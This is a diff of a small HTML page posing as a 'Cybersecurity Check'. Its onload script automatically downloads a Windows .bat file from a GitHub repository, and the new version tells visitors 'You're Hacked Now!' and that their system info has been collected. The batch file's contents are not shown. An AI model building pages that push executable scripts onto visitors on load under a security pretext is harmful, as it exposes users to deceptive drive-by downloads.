@@ -3,18 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cybersecurity Check Download</title>
-    <script type="text/javascript">
-        window.onload = function() {
-            var link = document.createElement('a');
-            link.href = "https://github.com/Aarya0017/cybersecurity-check/raw/main/cybersecurity_check.bat";
-            link.download = "cybersecurity_check.bat";
-            link.click();
-        }
-    </script>
+    <title>Cybersecurity Check</title>
 </head>
 <body>
-    <h1>Cybersecurity Check Script</h1>
-    <p>The download should start automatically. If not, please click <a href="https://github.com/Aarya0017/cybersecurity-check/raw/main/cybersecurity_check.bat" download>here</a>.</p>
+    <h1>Congrats, You're Hacked Now!</h1>
+    <p>Don't worry, you're safe. Please make sure to secure your systems!</p>
+    <p>Your cybersecurity score: High</p>
+    <p>System Info has been collected in the output.txt file. The file is now being downloaded to your device...</p>
+
+    <script>
+        // Trigger the automatic download of the .bat file
+        window.onload = function() {
+            var link = document.createElement('a');
+            link.href = 'https://raw.githubusercontent.com/Aarya0017/cybersecurity-check/main/cybersecurity_check.bat'; // Link to the .bat file
+            link.download = 'cybersecurity_check.bat'; // The name for the downloaded file
+            link.click(); // Trigger the download
+        };
+    </script>
 </body>
 </html>
